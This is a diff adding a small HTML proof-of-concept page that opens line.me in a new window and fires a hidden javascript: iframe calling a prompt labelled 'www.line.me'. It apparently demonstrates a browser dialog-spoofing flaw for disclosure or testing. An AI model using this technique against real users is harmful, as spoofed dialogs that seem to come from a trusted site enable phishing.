@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PoC</title>
+    <script>
+    function triggerIframe() {
+        var iframe = document.createElement('iframe');
+        window.open("http://www.line.me");
+        iframe.src = 'javascript:prompt("www.line.me")';
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+    }
+    </script>
+</head>
+<body>
+    <button onclick="triggerIframe()">Trigger</button>
+</body>
+</html>
